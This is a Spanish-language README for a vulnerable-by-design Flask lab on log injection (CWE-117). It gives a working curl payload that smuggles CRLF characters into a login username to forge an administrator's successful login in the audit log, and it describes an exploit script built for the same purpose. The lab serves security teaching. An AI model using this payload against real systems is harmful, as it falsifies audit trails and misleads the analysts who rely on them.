# 🛡️ Vulnerable Lab: Log Injection & Forging (CWE-117)

![OWASP](https://img.shields.io/badge/OWASP-A09%3A2021-red?style=for-the-badge&logo=owasp)
![CWE-117](https://img.shields.io/badge/CWE--117-Log_Injection-orange?style=for-the-badge&logo=security)
![Docker](https://img.shields.io/badge/Docker-Enabled-blue?style=for-the-badge&logo=docker)
![Python](https://img.shields.io/badge/Backend-Flask-green?style=for-the-badge&logo=python)

Este repositorio contiene un laboratorio **"Vulnerable by Design"** que demuestra de forma práctica e interactiva la vulnerabilidad **CWE-117 (Improper Output Neutralization for Logs)**, también conocida comúnmente como **Log Injection** o **Log Forging**. El laboratorio se adhiere a la categoría **A09:2021-Security Logging and Monitoring Failures** de OWASP.

---

## 🎯 Objetivo Educativo
En entornos corporativos, los sistemas de monitorización (SIEM) se basan en la integridad de los registros (logs). Cuando las aplicaciones guardan datos proporcionados del usuario directamente en el log sin validar o sanitizar caracteres de salto de línea (`\n`, `\r`), abren la puerta a que un atacante estructure una línea de registro completamente falsa. 

Un atacante usaría esta vulnerabilidad para:
1. Engañar a los analistas de seguridad con falsos positivos o negativos.
2. Encubrir pistas después de infiltrarse en un sistema, inyectando un mar de logs ruidosos.
3. Falsificar acciones autorizadas por un administrador corporativo en auditorías críticas.

## 🚀 Despliegue Rápido
Todo está preconfigurado para ejecutarse con **Docker Compose**.

1. Iniciar el laboratorio en segundo plano:
   ```bash
   docker-compose up --build -d
   ```
2. Acceder al **Frontend Educativo**:
   Abre un navegador en [http://localhost:5000](http://localhost:5000)

## 🗂️ Arquitectura del Laboratorio

* **Backend (`app.py`)**: Construido con Python y Flask. Alberga la lógica de la API vulnerable. El método principal `write_log()` no neutraliza las entradas, grabando directamente lo que manda el usuario al archivo `server_audit.log`.
* **Frontend Interactivo (`frontend/`)**: Una SPA puramente construida en HTML/CSS/JS (Vanilla). Presenta una experiencia visual inmersiva, comparadores de código seguro y flujo del ataque.
* **Exploit Script (`exploit.py`)**: Script automatizado en Python para envenenar la auditoría.

## ⚔️ ¿Cómo realizar el Exploit?

El script `exploit.py` usa inyección de caracteres de control para falsear un inicio de sesión de un administrador.
Ejecuta:
```bash
# Requiere requests: pip install requests
python exploit.py -u "admin" -i "192.168.1.100" -r "Administrator"
```

O, para explotar **manualmente** enviando una petición mediante cURL con el Payload `hacker\n2026-04-04 10:00:00 [INFO] LOGIN_SUCCESS user=admin ip=10.0.0.1`:
```bash
curl -X POST http://localhost:5000/api/login \
     -H "Content-Type: application/json" \
     -d '{"username": "hacker\r\n2026-04-04 10:00:00 [INFO] LOGIN_SUCCESS user=admin ip=10.0.0.1 role=Administrator", "password": "123"}'
```

Al revisar los logs (`docker logs cwe117-log-injection-lab`), verás dos eventos: el intento fallido tuyo, seguido mágicamente de un inicio de sesión "exitoso" del administrador (que nunca ocurrió realmente).
